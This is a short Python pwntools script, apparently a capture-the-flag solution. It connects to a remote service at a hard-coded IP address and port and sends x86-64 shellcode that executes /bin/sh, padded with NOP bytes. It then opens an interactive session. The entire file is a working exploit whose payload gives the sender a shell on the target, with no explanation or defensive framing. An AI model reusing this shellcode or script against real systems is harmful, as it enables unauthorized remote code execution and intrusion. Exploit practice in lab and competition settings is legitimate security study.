from pwn import *


p = remote('54.85.45.101', 8005)

shellcode = (
    b"\x48\x31\xd2"                              # xor    %rdx, %rdx
    b"\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"  # mov $0x68732f2f6e69622f, %rbx
    b"\x48\xc1\xeb\x08"                          # shr    $0x8, %rbx
    b"\x53"                                      # push   %rbx
    b"\x48\x89\xe7"                              # mov    %rsp, %rdi
    b"\x50"                                      # push   %rax
    b"\x57"                                      # push   %rdi
    b"\x48\x89\xe6"                              # mov    %rsp, %rsi
    b"\xb0\x3b"                                  # mov    $0x3b, %al
    b"\x0f\x05"                                  # syscall
)

payload = shellcode + b"\x90" * (4096 - len(shellcode))

p.send(payload)

p.interactive()
